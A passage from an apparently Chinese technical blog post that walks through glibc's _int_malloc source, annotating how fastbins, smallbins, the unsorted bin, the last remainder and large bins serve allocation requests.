href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><blockquote><p>_int_malloc 是内存分配的核心函数，其核心思路有如下<br>1：它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。<br>2：它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。<br>3：当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。<br>4：当 top chunk 也无法满足时，堆分配器才会进行内存块申请。<br>在进入该函数后，函数立马定义了一系列自己需要的变量，并将用户申请的内存大小转换为内部的 chunk 大小。</p></blockquote><h3 id="初始数据"><a href="#初始数据" class="headerlink" title="初始数据"></a>初始数据</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">_int_malloc</span><span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> size_t bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//bytes是用户所申请的大小 </span>    INTERNAL_SIZE_T nb<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* normalized request size */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>    idx<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* associated bin index */</span>    mbinptr         bin<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* associated bin */</span>    mchunkptr       victim<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* inspected/selected chunk */</span>    INTERNAL_SIZE_T size<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* its size */</span>    <span class="token keyword">int</span>             victim_index<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* its bin index */</span>    mchunkptr     remainder<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* remainder from a split */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> remainder_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* its size */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> block<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* bit map traverser */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> bit<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* bit map traverser */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> map<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* current word of binmap */</span>    mchunkptr fwd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* misc temp for linking */</span>    mchunkptr bck<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* misc temp for linking */</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>errstr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*       Convert request size to internal form by adding SIZE_SZ bytes       overhead plus possibly more to obtain necessary alignment and/or       to obtain a size of at least MINSIZE, the smallest allocatable       size. Also, checked_request2size traps (returning 0) request sizes       that are so large that they wrap around zero when padded and       aligned.     */</span>    <span class="token function">checked_request2size</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//将bytes规范对齐，并赋值给nb</span></code></pre><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from mmap. 如果没有可用的arena那么将会调用sysmalloc来获得chunk */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span><span class="token punctuation">(</span>av <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span><span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="fastbins-1"><a href="#fastbins-1" class="headerlink" title="fastbins"></a>fastbins</h3><blockquote><p>如果申请的 chunk 的大小位于 fastbin 范围内，需要注意的是这里比较的是无符号整数。此外，是从 fastbin 的头结点开始取 chunk。</p></blockquote><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/*       If the size qualifies as a fastbin, first check corresponding bin.       This code is safe to execute even if av is not yet initialized, so we       can try it without checking, which saves some time on this fast path.     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//由nb获取对应fastbins的index</span>        idx             <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//可以看出这是exact fit</span>        <span class="token comment" spellcheck="true">//fastbinsY中获取对应index的free chunk</span>        mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>        mchunkptr    pp <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//fb中存放&amp;fastbinsY[index]，mchunkptr存放fastbinsY[index]的free chunk地址</span>        <span class="token comment" spellcheck="true">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            victim <span class="token operator">=</span> pp<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pp <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_acq</span><span class="token punctuation">(</span>fb<span class="token punctuation">,</span> victim<span class="token operator">-></span>fd<span class="token punctuation">,</span>                                                            victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 存在可以利用的chunk</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span>            <span class="token comment" spellcheck="true">// 根据取得的 victim ，利用 chunksize 计算其大小。</span>            <span class="token comment" spellcheck="true">// 利用fastbin_index 计算 chunk 的索引。</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>            errout<span class="token punctuation">:</span>                <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 细致的检查。。只有在 DEBUG 的时候有用</span>            <span class="token function">check_remalloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 将获取的到chunk转换为mem模式</span>            <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span>            <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//返回mem地址</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="smallbins-1"><a href="#smallbins-1" class="headerlink" title="smallbins"></a>smallbins</h3><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/*       If a small request, check regular bin.  Since these "smallbins"       hold one size each, no searching within bins is necessary.       (For a large request, we need to wait until unsorted chunks are       processed to find best fit. But for small ones, fits are exact       anyway, so we can check now, which is faster.)     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取 small bin 的索引</span>        idx <span class="token operator">=</span> <span class="token function">smallbin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取对应 small bin 中的 chunk 指针</span>        bin <span class="token operator">=</span> <span class="token function">bin_at</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//可以看出这是exact fit</span>        <span class="token comment" spellcheck="true">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span>        <span class="token comment" spellcheck="true">// 如果 victim = bin ，那说明该 bin 为空。</span>        <span class="token comment" spellcheck="true">// 如果不相等，那么会有两种情况</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">last</span><span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//如果这里对应的bin没有插入freechunk 则last (bin) == bin</span>            <span class="token comment" spellcheck="true">// 第一种情况，small bin 还没有初始化。</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* initialization check */</span>                <span class="token comment" spellcheck="true">// 执行初始化，将 fast bins 中的 chunk 进行合并，并给bins初始化</span>                <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 第二种情况，small bin 中存在空闲的 chunk</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 获取 small bin 中倒数第二个 chunk 。</span>                bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 检查 bck->fd 是不是 victim，防止伪造</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//如果victim->bk还指向这一个free chunk 那么该free chunk的fd是要回指victim的</span>                    errstr <span class="token operator">=</span> <span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">;</span>                    <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//设置物理相邻的下一个chunk的inuse位为1，因为本chunk已经是要被使用了</span>                <span class="token function">set_inuse_bit_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来，FIFO</span>                bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//恢复链表</span>                bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 如果不是 main_arena，设置对应的标志</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span> <span class="token function">set_non_main_arena</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 细致的检查，非调试状态没有作用</span>                <span class="token function">check_malloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 将申请到的 chunk 转化为对应的 mem 状态</span>                <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span>                <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="放入largebins"><a href="#放入largebins" class="headerlink" title="放入largebins"></a>放入largebins</h3><blockquote><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p></blockquote><pre class=" language-c"><code class="language-c">_int_malloc<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取large bin的下标。</span>        idx <span class="token operator">=</span> <span class="token function">largebin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 如果存在fastbin的话，会处理 fastbin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h4 id="遍历-unsorted-bin"><a href="#遍历-unsorted-bin" class="headerlink" title="遍历 unsorted bin"></a>遍历 unsorted bin</h4><p>如果在之前的遍历中(smallbins fastbins)无法满足best fit则遍历 unsorted bin<br>在接下来的这个循环中，主要做了以下的操作</p><ul><li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<ul><li>如果是 small request，则考虑是不是恰好满足，是的话，直接返回。</li><li>如果不是的话，放到对应的 bin 中。</li></ul></li><li>尝试从 large bin 中分配用户所需的内存</li></ul><p>先考虑 unsorted bin，再考虑 last remainder 但是对于 small bin chunk 的请求会有所例外 （SMALL REQUEST）：</p><pre class=" language-c"><code class="language-c">        <span class="token comment" spellcheck="true">// 如果 unsorted bin 不为空</span>        <span class="token comment" spellcheck="true">// First In First Out</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// victim 为 unsorted bin 的最后一个 chunk</span>            <span class="token comment" spellcheck="true">// bck 为 unsorted bin 的倒数第二个 chunk</span>            bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 判断得到的 chunk 是否满足要求，不能过小，也不能过大</span>            <span class="token comment" spellcheck="true">// 一般 system_mem 的大小为132K</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>                <span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>                                <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 得到victim对应的chunk大小。</span>            size <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果用户的请求为 small bin chunk，那么我们首先考虑 last remainder，如果 last remainder 是 unsorted bin 中的唯一一块的话， 并且 last remainder 的大小分割后还可以作为一个 chunk </p><pre class=" language-c"><code class="language-c">            <span class="token comment" spellcheck="true">/*               If a small request, try to use last remainder if it is the               only chunk in unsorted bin.  This helps promote locality for               runs of consecutive small requests. This is the only               exception to best-fit, and applies only when there is               no exact fit for a small chunk.             */</span>              <span class="token comment" spellcheck="true">/*1处于smallbinsfanwei 2存在last_remainder   3 size大于nb + MINSIZE，保证可以进行切割   */</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">/* split and reattach remainder */</span>                <span class="token comment" spellcheck="true">// 获取新的 remainder 的大小</span>                remainder_size          <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 获取新的 remainder 的位置</span>                remainder               <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 更新 unsorted bin 的情况</span>                <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 更新 av 中记录的 last_remainder</span>                av<span class="token operator">-></span>last_remainder                                <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 更新last remainder的指针</span>                remainder<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                    remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 设置victim的头部，</span>                <span class="token function">set_head</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                                     <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置 remainder 的头部</span>                <span class="token function">set_head</span><span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置记录 remainder 大小的 prev_size 字段，因为此时 remainder 处于空闲状态。</span>                <span class="token function">set_foot</span><span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 细致的检查，非调试状态下没有作用</span>                <span class="token function">check_malloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 将 victim 从 chunk 模式转化为mem模式</span>                <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span>                <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>这部分代码的整体意思就是遍历<code>unsortedbin</code>，从中查找是否有符合用户要求大小的chunk并返回。<br>第一个<code>while</code>循环从尾到头依次取出<code>unsortedbin</code>中的所有<code>chunk</code>，将该chunk对应的前一个chunk保存在<code>bck</code>中，并将大小保存在<code>size</code>中。<br>如果用户需要分配的内存大小对应的chunk属于<code>smallbin</code>，<code>unsortedbin</code>中只有这一个chunk，并且该chunk属于<code>last remainder chunk</code>且其大小大于用户需要分配内存大小对应的chunk大小加上最小的chunk大小（保证可以拆开成两个chunk），就将该chunk拆开成两个chunk，分别为<code>victim</code>和<code>remainder</code>，进行相应的设置后，将用户需要的<code>victim</code>返回。<br>如果不能拆开，就从<code>unsortedbin</code>中取出该<code>chunk（victim）</code>。<br>再下来，如果刚刚从unsortedbin中取出的<code>victim</code>正好是用户需要的大小<code>nb</code>，就设置相应的标志位，直接返回该<code>victim</code><br>取出：</p><pre class=" language-c"><code class="language-c">            <span class="token comment" spellcheck="true">/* remove from unsorted list 最后的chunk解除链接 */</span>            <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>            bck<span class="token operator">-></span>fd                 <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果从 unsorted bin 中取出来的 chunk 大小正好合适，就直接使用。</p><pre class=" language-c"><code class="language-c"> <span class="token comment" spellcheck="true">/* Take now instead of binning if exact fit */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> nb<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//设置物理相邻的下一个chunk的inuse位为1</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p><strong>如果不适合那就看其大小，来放到smallbins或者largebins中</strong><br>smallbins:</p><pre><code>            /* place chunk in bin */            if (in_smallbin_range(size)) {                victim_index = smallbin_index(size);  //获取下标                bck          = bin_at(av, victim_index);  //获取表头                fwd          = bck-&gt;fd;  //获取第一个chunk            ......            ....            ...            /*          mark_bin (av, victim_index);   //标记          victim-&gt;bk = bck;   //vim的前一个chunk指针，指向表头          victim-&gt;fd = fwd;   //vim的下一个chunk指针，指向原来的第一个chunk   （FIFO，chunk是从队列的尾部提取的）          fwd-&gt;bk = victim;   //bk指针恢复          bck-&gt;fd = victim;   //fd指针恢复</code></pre><h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><h4 id="如果largebins中没有chunk"><a href="#如果largebins中没有chunk" class="headerlink" title="如果largebins中没有chunk"></a>如果largebins中没有chunk</h4><pre class=" language-c"><code class="language-c">              victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//下标</span>              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取表头</span>              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取第一个chunk</span>              <span class="token comment" spellcheck="true">/* maintain large bins in sorted order */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//检查是否空闲</span>                <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">/* Or with inuse bit to speed comparisons */</span>                  size <span class="token operator">|</span><span class="token operator">=</span> PREV_INUSE<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* if smaller than smallest, bypass loop below */</span>                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token 